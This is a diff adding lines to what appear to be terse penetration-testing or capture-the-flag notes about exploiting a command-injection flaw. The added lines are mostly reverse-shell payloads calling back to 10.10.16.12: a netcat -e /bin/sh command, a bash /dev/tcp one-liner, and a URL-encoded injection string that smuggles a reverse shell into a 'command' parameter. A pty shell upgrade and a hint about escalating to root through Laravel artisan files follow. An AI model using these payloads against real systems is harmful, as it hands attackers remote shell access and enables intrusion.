@@ -129,6 +129,20 @@ command injection exists
 we cann run a nc server
 we got a connect back but it went
 
+trying pentest monkey: `nc -e /bin/sh 10.10.16.12 4444`
+
+bash -i >& /dev/tcp/10.10.16.12/8081 0>&1
+
+command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.12/4444+0>%261'%26host=
+ 
+got a shell 
+
+python -c 'import pty;pty.spawn("bash")'
+
+getting to root means modifying laravel artisan files
+
+
+
 
 
 
